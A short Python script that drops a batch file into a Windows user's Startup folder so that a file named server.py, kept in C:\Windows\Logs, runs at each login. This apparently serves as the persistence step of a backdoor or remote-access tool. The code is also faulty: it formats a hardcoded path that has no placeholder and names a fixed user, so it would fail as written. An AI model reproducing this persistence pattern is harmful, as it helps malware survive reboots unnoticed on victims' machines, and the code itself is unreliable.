import os
import getpass

USER_NAME = getpass.getuser()


def add_to_startup(file_path='C:\Windows\Logs\server.py'):
    bat_path = r'C:\Users\black\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + 'open.bat', 'w+') as bat_file:
        bat_file.write(r'start "name" %s' % file_path)

if __name__ == '__main__':
    add_to_startup()
